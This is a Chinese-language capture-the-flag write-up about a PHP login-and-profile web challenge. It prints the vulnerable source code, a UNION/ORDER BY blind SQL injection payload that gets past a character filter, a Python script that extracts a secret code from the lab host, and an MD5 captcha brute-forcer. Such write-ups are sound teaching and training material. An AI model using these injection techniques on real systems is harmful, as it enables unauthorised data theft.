---
title: AH-Web-Write-Up
date: 2018-06-12 16:34:37
categories: Write Up
tags:
description:
---

记录一下一些题目
<!-- more -->
# Injection
很有意思的一道题目，也看了别人wp，懂得了很多，写一下自己的理解

<br>
## 题目分析
提示给的是 注入！注入！注入！
访问靶机，出现一张简单的登录页面

![injection1](injection1.png)


随便尝试一些弱口令和万能密码，没什么结果，右键源代码，发现提示信息

![injection2](injection2.png)

进入是一张注册界面，简单的注册个账户，先尝试登录，发现登录成功，发现很明显的id参数，所以直接开始尝试一下其他id的值(1,2,3,4)

![injection3](injection3.png)


发现`id=1`是admin的账户并且给出了提示


![injection4](injection4.png)

访问后发现是站点源码，只有5张页面

![injection5](injection5.png)

先看`profile.php`，由于代码量，所以只给出关键代码

页面开头给出了表结构，但是第四列是一个变量，也就是我们无法得到第四列名的信息
```
/*
CREATE TABLE `users` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `user` varchar(20) DEFAULT NULL,
  `pass` varchar(32) DEFAULT NULL,
  `$secret` varchar(36) DEFAULT NULL,
  `count` int(3) DEFAULT NULL,
  PRIMARY KEY (`id`)
)
*/
```

剩下代码业务逻辑大致是 访问页面后会判断用户信息，记录访问次数，如果访问次数超过140次，那么兑换码就会被重置($secret字段就是存兑换码的字段)
而兑换码是根据`1234567890abcdefghijklmnopqrstuvwxyz`乱序去生成的
关键代码如下
```
// 兑换码生成与验证
function duihuanma_product()
{
    $string = "1234567890abcdefghijklmnopqrstuvwxyz";
    return str_shuffle($string);
}

function change($secret)
{
    global $username,$row;
    $duihuanma = duihuanma_product();
    $row = mysql_fetch_array(mysql_query("select * from users where user='$username'"));
    $count = $row['count'];
    if (!$row[$secret]){
        mysql_query("update users set $secret='{$duihuanma}' where user='$username'");
    }
    if($row['count'] == 140)
    {

        if(mysql_query("update users set $secret='{$duihuanma}' where user='$username';"))
        {
            mysql_query("update users set count=0 where user='$username';");
            die("<center><br><h3>尝试次数过多，兑换码已经重置</h3></center>");
        }
        return $duihuanma;
    }
    else
    {
    mysql_query("update users set count=({$row['count']} + 1) where user='$username';");
    }
    return $row[$secret];
}

// id值的业务代码
$id=$_GET['id']?$_GET['id']:0;
if(preg_match("#\.#",$id) or preg_match("#_#",$id) or preg_match("#\(#",$id) or preg_match("#\)#",$id))
    die('<h3>danger character dectected</h3>');
$sql = "select * from users where id=$id";
$result = mysql_query($sql);
$rownew = @mysql_fetch_array($result);
$rownew['user']=$rownew['user']?$rownew['user']:"noman";
?>
<h3>This is <?php echo $rownew['user'];?> page,您已经访问<?php echo $row['count']+1;?>次</h3><br>
<?php
if ($rownew['user']==='admin'){
    echo "<br><h3>good job,hint: thisissourcecode.zip</h3>";
}
```

在看`flag.php`页面，界面效果如下

![injection6](injection6.png)

看页面也知道需要兑换码和md5验证才能获得flag，关键代码如下
```
// 验证码生成
$captcha= getCaptcha(4);
$_SESSION['captcha'] = $captcha;
function getCaptcha($length){
	$str = null;
	$strPol = "0123456789abcdef";
	$max = strlen($strPol)-1;

	for($i=0;$i<$length;$i++){
		$str.=$strPol[rand(0,$max)];
	}
	return $str;
}

// 对比验证码
if (isset($_POST['captcha']) && isset($_POST['duihuanma'])) {
	if(!(substr(md5($_POST['captcha']), 0, 4)===$_SESSION['captcha']))
		die('<center><p>captcha not right</p></center>');
    $sql = "select $secret from users where user='${_SESSION['username']}'";
    #echo $sql;
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);

}

// 对比兑换码
if (isset($_POST['duihuanma'])){
  if ($row[$secret]===$_POST['duihuanma']){
      echo "<br><center>".$flag."</center>";
  }else{
      echo "<center>flag兑换码不正确</center>";
  }
}
```
<br>
## Order by 盲注获得兑换码
代码审计下来得到了大致的思路，需要先注入得到兑换码，然后在爆破MD5验证码后，提交即可

但是注入过滤了`. _ ( )` ，所以我们无法使用函数
同时我们也不知道兑换码字段名称，那么常规的方法无从下手
查阅资料得到，可以通过order by的一种注入手段来得到数据内容，具体原理可以看以下两篇文章，总结的很好
[利用order by 进行盲注](http://p0sec.net/index.php/archives/106/)
[基于union查询的盲注(感谢pcat牛不吝赐教)](http://wonderkun.cc/index.html/?p=547)

我们可以利用**UNION与ORDER BY 在不需要知道列名的情况下盲注得到真实数据**

假设兑换码第一个字符是`5`，当我们执行如图的语句之后，由于`6`的ASCII码比`5`大，所以还是显示原来的数据内容

![injection7](injection7.png)
![injection8](injection8.png)
![injection9](injection9.png)

观察上面的图片，就能发现
 - 传入值大于兑换码值，会显示原来的数据
 - 传入值小于或等于兑换码，会显示`union`的数据

但是题目要求我们在140内需要得到答案，如果使用了二分法也无法达到140内(测试下来一个数大概需要5-6次便可以确定，36个数便远远超过预设值)

但是兑换码生成的算法是**乱序**，也就是说每一个字符必定只出现一次(在想的时候[gokoucat大佬](http://gokoucat.cn/)看一眼就找到了关键点，膜拜)

那么便有可能达到140内，并且最后一次也无需去发送请求(同时膜拜[phorse师傅如何更高效的盲注爆取数据-二分法](https://xz.aliyun.com/t/1520/?utm_source=tuicool&utm_medium=referral))
那么我们便可以写出python脚本
```python
# coding=utf-8
import requests
import math

ALL = "0123456789abcdefghijklmnopqrstuvwxyz"
flag = ""
cookies = {"PHPSESSID": "7v527f98146aite4mobo4n0b13"}
count = 0
for i in range(35):
    left = 0
    right = len(ALL) - 1
    mid = int(math.ceil((left + right) / 2.0))
    while left < right:
        count += 1
        url = "http://10.10.118.51/profile.php?id=5 union select 1,2,3,'"+ flag + str(ALL[mid]) + "',5 order by 4"
        res = requests.get(url, cookies=cookies).text
        if "This is 2 page" in res:
            left = mid
        else:
            right = mid - 1
        mid = int(math.ceil((left + right) / 2.0))
        print(left, mid, right)
    flag += ALL[mid]
    # 去除已经出现的字符
    ALL = ALL.replace(ALL[mid], '')

print("-" * 100)
print(flag+ALL)
print(count)
print("-" * 100)
```
这边需要注意的是，由于`x<mid or x = mid`的回显情况相同都是`This is 2 page`，而`x>mid`的回显情况是`id=5的用户名` (x为兑换码)
所以计算`mid`需要向上取整

结果如下
![injection10](injection10.png)

<br>
## 爆破MD5验证码
我们已经获得了兑换码，那么还需要利用简单的python脚本爆破MD5验证码
```
import hashlib

result = 1
while True:
    m = hashlib.md5(str(result))
    m = m.hexdigest()
    if m[0:4] == "ee6a":
        print(m)
        print(result)
        break
    result += 1
```
结果如下

![injection11](injection11.png)

提交后可以成功获取flag值

![injection12](injection12.png)


后来在google中也找到了原题的wp，非常详细的解答
[【原创】Pwnhub会员日一题引发的思考](https://xz.aliyun.com/t/1520/?utm_source=tuicool&utm_medium=referral#toc-2)
